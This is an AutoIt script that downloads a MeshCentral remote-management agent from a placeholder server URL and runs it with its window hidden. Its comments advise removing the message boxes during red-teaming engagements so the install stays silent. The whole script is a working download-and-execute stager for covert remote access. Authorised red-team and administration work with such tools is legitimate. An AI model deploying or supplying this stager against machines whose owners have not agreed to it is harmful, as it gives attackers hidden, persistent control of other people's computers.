; This is a very basic MeshCentral agent installer using an AutoIT compiled executable.
; Replace the portion that says "(Replace with your MeshCentral server URL)" with an actual valid download link to your MeshCentral server (remove parenthesis also).  
; If using this in a red teaming engagement, remove the MsgBox portions of the script.  

Local $installerName = "meshagent.exe"
Local $downloadUrl = "(Replace with your MeshCentral server URL)"
Local $downloadPath = @ScriptDir & "\" & $installerName

ConsoleWrite("Downloading MeshCentral agent installer..." & @CRLF)
InetGet($downloadUrl, $downloadPath, 1)

If Not FileExists($downloadPath) Then
    MsgBox(16, "Error", "Download failed. File not found at: " & $downloadPath)
    Exit 1
EndIf

ConsoleWrite("Running MeshCentral agent..." & @CRLF)
; Use run parameter to execute the agent
Local $exitCode = RunWait('"' & $downloadPath & '" run', "", @SW_HIDE)

If $exitCode = 0 Then
    MsgBox(64, "Success", "MeshCentral agent installed successfully.")
Else
    MsgBox(16, "Install Failed", "Installation failed with exit code: " & $exitCode)
EndIf